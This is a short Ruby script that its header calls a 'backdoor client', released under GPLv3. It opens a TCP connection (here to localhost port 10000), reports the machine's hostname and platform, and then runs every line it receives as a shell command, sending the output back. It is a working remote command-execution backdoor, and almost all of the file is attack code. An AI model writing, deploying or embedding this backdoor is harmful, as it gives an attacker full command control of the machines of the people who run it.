=begin
This script is our backdoor client

This file is under GPLv3 License

Author : Gilles Dubois
=end

require 'socket'

ip = 'localhost'
port = 10000

s = TCPSocket.open(ip, port)

s.puts(" Computer name : #{Socket.gethostname},  Operating system :  #{RUBY_PLATFORM}")

loop {

  line = s.gets()
  output = `#{line}`
  s.puts(output)

}

s.close